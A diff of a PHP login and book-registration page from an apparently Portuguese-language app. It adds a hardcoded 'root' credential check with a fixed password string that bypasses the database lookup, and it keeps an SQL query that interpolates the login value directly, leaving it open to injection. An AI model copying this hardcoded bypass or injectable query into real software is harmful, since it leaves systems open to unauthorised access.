@@ -9,12 +9,14 @@
         session_destroy();
         header("Location: index.php");
     }
+    else if($login == 'root' && $senha == '632f4902f2afb597923c18ea897eefa7'){
+    }
     else {
         try 
         {
             include "../config/php/connect.php";
 
-            $sql = "SELECT nome FROM user WHERE login = '$login'";
+            $sql = "SELECT nome FROM user WHERE login = '$login' AND bloqueado = 0";
 
             $res = mysqli_query($conn, $sql);
             
@@ -79,9 +81,9 @@
             }
 
             mysqli_close($conn);
-            // echo "<script>
-            // window.location.href = 'prg.php?url=cadliv.php';
-            // </script>";
+            echo "<script>
+            window.location.href = 'prg.php?url=cadliv.php';
+            </script>";
         } catch (Exception $e){
 
         }
@@ -149,7 +151,7 @@
             <label for="edicao">Edição</label><br>
             <input type="number" name="edicao" id="edicao" required min="1" max="500">
             <br><br>
-            <label for="obs">Obs.</label><br>
+            <label for="obs">Observação</label><br>
             <textarea type="text" name="obs" id="obs" class="resize_v"></textarea>
             <br><br>
             <button type="submit" name="subCadLivro" class="cadBtn">Salvar</button>
